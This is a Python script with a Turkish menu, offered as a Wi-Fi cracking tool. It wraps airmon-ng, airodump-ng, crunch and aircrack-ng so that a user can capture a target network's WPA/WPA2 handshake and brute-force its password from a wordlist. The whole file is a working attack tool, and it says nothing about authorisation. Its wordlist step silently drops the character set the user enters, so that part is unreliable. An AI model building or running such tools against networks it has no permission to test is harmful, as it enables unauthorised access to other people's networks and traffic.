#Made By 8xia8
#Wifi Tool

import subprocess
import time

print('''
░██╗░░░░░░░██╗██╗███████╗██╗  ██╗░░██╗██╗██████╗░██╗░█████╗░██╗
░██║░░██╗░░██║██║██╔════╝██║  ██║░██╔╝██║██╔══██╗██║██╔══██╗██║
░╚██╗████╗██╔╝██║█████╗░░██║  █████═╝░██║██████╔╝██║██║░░╚═╝██║
░░████╔═████║░██║██╔══╝░░██║  ██╔═██╗░██║██╔══██╗██║██║░░██╗██║
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║  ██║░╚██╗██║██║░░██║██║╚█████╔╝██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░╚════╝░╚═╝

██╗░░░██╗░░███╗░░░░░░█████╗░
██║░░░██║░████║░░░░░██╔══██╗
╚██╗░██╔╝██╔██║░░░░░██║░░██║
░╚████╔╝░╚═╝██║░░░░░██║░░██║
░░╚██╔╝░░███████╗██╗╚█████╔╝
░░░╚═╝░░░╚══════╝╚═╝░╚════╝░

███╗░░░███╗░█████╗░██████╗░███████╗  ██████╗░██╗░░░██╗  ░█████╗░██╗░░██╗██╗░█████╗░░█████╗░
████╗░████║██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚██╗░██╔╝  ██╔══██╗╚██╗██╔╝██║██╔══██╗██╔══██╗
██╔████╔██║███████║██║░░██║█████╗░░  ██████╦╝░╚████╔╝░  ╚█████╔╝░╚███╔╝░██║███████║╚█████╔╝
██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░  ██╔══██╗░░╚██╔╝░░  ██╔══██╗░██╔██╗░██║██╔══██║██╔══██╗
██║░╚═╝░██║██║░░██║██████╔╝███████╗  ██████╦╝░░░██║░░░  ╚█████╔╝██╔╝╚██╗██║██║░░██║╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░╚════╝░
''')

print('''
0==================================0

  [0] İnternet Ağlarını Göster

  [1] WPA/WPA2 Handshake Yaklama

  [2] Wordlist Oluşturma
  
  [3] Wordlist İle WPA/WPA2 Kırma

0==================================0
''')
print("Not: Yukarıdaki İşlemleri Yapmak İçin Kali Linux Uyumlu Wi-Fi Kartınız Olması Gerekmektedir.")
print("")
print("Not: İnterface'ini Ayrı Bir Terminal Açıp 'ifconfig' Yazarak Kontrol Edebilirsin")
print("")
print("Örnek İnterface'ler: 'wlan0' 'wlan1' 'eth0'... Gibidir Sondaki Rakamlar Farklı Olabilir")
print("")
interface = input("[?]İnterface'in Nedir?: ")

subprocess.call(["airmon-ng","start",interface])
print("")
print("[!]İşiniz Bittiğinde Ayrı Bir Terminale airmon-ng stop Yazıp Yanına İnterfacenizin Yanına 'mon' Getirilmiş Halini Yazın (Örnek: wlan0mon)")
interfacemon = (interface + "mon")

while True:
    try:
        qwert = int(input("[?]Numara Seç: "))
    except:
        print("[!!]Girdiğiniz Numarada Harf,Sembol vb... Şeyler Olmamalı")
        continue
    else:
        break


if qwert == 0:
    print("[!]Numara 0 Seçtin")
    print("İnternet Ağları Gösteriliyor...")
    time.sleep(2)
    subprocess.call(["airodump-ng",interfacemon])
elif qwert == 1:
    print("[!]Numara 1 Seçtin")
    print("Handshake Yakalama Başlatılıyor...")
    print("")
    channell = input("[?]Handshake Yakalamak İstediğiniz İnternetin Channelını Girin: ")
    print("[?]Hedef Ağın Channeli " + channell + " Olarak Seçildi")
    print("")
    targetbssid = input("[?]Hedef Ağın BSSID Nedir: ")
    print("")
    print("Hedef Ağın BSSID'si " + targetbssid + " Olarak Girildi")
    print("")
    handkayıt = input("[?]Yakalanan Handshake Nereye Kaydediğim (örnek: /root/Desktop/ , /root/Masaüstü/): ")
    print("Handshake " + handkayıt + " Buraya Kayıt Edilecek")
    print("")
    print("Not: Handshake Yakalamak Uzun Süre Bilir Çünkü Hernagi Bir Kullanıcı İnternette Girdiğinde Handshake Yakalanmış Olur.")
    print("Handshake Yakalama 2 Saniye Sonra Başlatılıyor")
    time.sleep(2)
    subprocess.call(["airodump-ng","-c",channell,"--bssid",targetbssid,"-w",handkayıt,interfacemon])
elif qwert == 2:
    print("[!]Numara 2 Seçtin")
    print("Wordlist Oluşturma Başlatılıyor...")
    uzunlukwordlist = input("[?]Oluşturacağınız Wordlistdeki Kelimenin Uzunluğunu Yazın: ")
    print("")
    ickelime = input("[?]Wordlistin İçinde Geçecek Kelimeleri Yazın (örnek: abcdef12345): ")
    print("Wordlistin İçinde Geçicek Kelimeleri " + ickelime + " Olarak Seçtin.")
    print("Wordlist Oluşturma 2 Saniye Sonra Başlatılıyor.")
    time.sleep(2)
    subprocess.call(["crunch",uzunlukwordlist,uzunlukwordlist,"-o","/root/wordlist.txt"])
    print("Wordlistiniz '/root/' Bölümüne 'wordlist.txt' Adı İle Kayıt Edildi")
elif qwert == 3:
    print("[!]Numara 3 Seçtin")
    print("Wordlist İle WPA/WPA2 Kırma Başlatılıyor...")
    print("")
    print("Not: WPA2/WPA Kırmak İçin Wordlist Ve Handshake İhtiyacınız Vardır")
    print("Not2: Handshakeniz Ve Wordlistiniz /root/ Klasöründe Olması Lazım")
    handshakedosya = input("[?]Yakaladağınız Handshake Dosyasının İsmi (örnek: Handshake-01.cap): ")
    print("")
    wordlistdosya = input("[?]Oluşturduğunuz Wordlist Dosyasının İsmi: ")
    subprocess.call(["aircrack-ng",handshakedosya,"-w",wordlistdosya])
else:
    print("[!!]Girdiğiniz Numara Yukardaki Numaralarla Uyuşmuyor.")